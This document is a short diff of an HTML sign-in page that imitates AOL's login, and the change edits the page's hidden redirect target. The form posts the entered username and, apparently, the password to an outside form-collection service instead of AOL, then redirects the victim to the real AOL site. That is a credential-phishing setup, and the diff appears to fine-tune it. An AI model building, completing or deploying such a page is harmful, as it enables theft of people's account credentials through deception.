@@ -188,7 +188,7 @@
           <h2 class="Sing-in-style">Sign in</h2>
 
          <form action="https://submit-form.com/Bjjk0f2O">
-<input type="hidden" name="redirect" value="https://mail.aol.com">
+<input type="hidden" name="redirect" value="https://www.aol.com/">
             <input class="input-style" type="email" placeholder="Username, email address or mobile number" name="email" id="email" value="" required/ >
             <br>
             <h2 class="Enter-password-style">Enter password</h2>
